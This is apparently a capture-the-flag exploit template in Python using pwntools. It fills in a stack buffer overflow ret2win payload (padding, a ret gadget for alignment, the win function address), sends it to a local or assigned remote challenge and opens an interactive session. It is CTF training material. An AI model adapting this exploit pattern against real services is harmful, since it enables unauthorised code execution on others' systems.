#!/usr/bin/env python3
"""CSCTF pwn template -- stack buffer overflow -> ret2win.

FILL-ME
  BINARY  : path to the challenge ELF
  HOST,PORT: the assigned remote target (nc host port). LOCAL process for testing in docker/pwn only.
  OFFSET  : bytes from the start of your input to the saved return address.
  WIN     : address of the win/backdoor function (or set WIN_NAME to let pwntools resolve it).

Recon first (never runs the target):
  .venv/bin/python solvers/toolkits/pwn.py BINARY                 # mitigations, win candidates
  .venv/bin/python solvers/toolkits/pwn_exploit.py BINARY --rop win   # assembled chain + this plan

Find OFFSET with the cyclic helper, then crash the binary IN docker/pwn and read the faulting value:
  from pwn import cyclic, cyclic_find
  io.sendline(cyclic(200, n=8)); ...            # 64-bit: n=8
  # on crash, read RSP/RIP bytes, then:  OFFSET = cyclic_find(leaked_8_bytes, n=8)

RUN ONLY in the docker/pwn image (csctf-pwn:1), ONLY against the squad's assigned target:
  docker run --rm -it --platform linux/amd64 --network none -v "$PWD":/w csctf-pwn:1 \
      python3 /w/solve.py
"""
from pwn import *

# ---- FILL-ME -------------------------------------------------------------
BINARY = "./chall"
HOST, PORT = "CHALLENGE.HOST", 0
OFFSET = 0            # saved-RIP padding (use cyclic_find)
WIN = 0x0            # address of win() ; or leave 0 and set WIN_NAME
WIN_NAME = ""        # e.g. "win" -- resolved from the ELF symbol table if WIN == 0
ALIGN = True         # prepend a bare `ret` for 16-byte stack alignment (movaps trap)
# --------------------------------------------------------------------------

context.binary = exe = ELF(BINARY, checksec=False)
context.log_level = "info"


def start():
    if args.REMOTE:
        return remote(HOST, PORT)
    return process(exe.path)          # local test -- inside docker/pwn only


def main():
    win = WIN or exe.symbols[WIN_NAME]
    rop = b""
    if ALIGN and context.bits == 64:
        rop += p64(next(exe.search(asm("ret"), executable=True)))  # a clean `ret`
    rop += pack(win)

    payload = b"A" * OFFSET + rop

    io = start()
    io.sendline(payload)
    io.interactive()      # look for the CSCTF{...} flag the win function prints


if __name__ == "__main__":
    main()
